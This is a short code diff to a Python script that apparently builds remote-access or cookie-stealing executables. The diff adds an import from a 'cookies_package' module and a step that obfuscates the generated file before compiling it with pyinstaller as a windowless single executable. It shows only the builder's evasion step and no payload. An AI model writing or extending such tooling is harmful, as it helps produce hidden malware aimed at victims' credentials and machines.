@@ -17,6 +17,8 @@
 import os
 import shutil
 
+### Downloaded Modules ###
+from cookies_package import *
 
 def build(IP, PORT, type):
     os.system("cls")
@@ -32,6 +34,9 @@ def build(IP, PORT, type):
     # Write the new data to the file
     with open(os.getcwd() + "\\" + type + ".py", "w") as file:
         file.write(data)
+
+    # Obfusacate the file
+    obfusacate(os.getcwd() + "\\" + type + ".py")
 
     # Compile the file
     os.system("pyinstaller --onefile --noconsole " + os.getcwd() + "\\" + type + ".py")
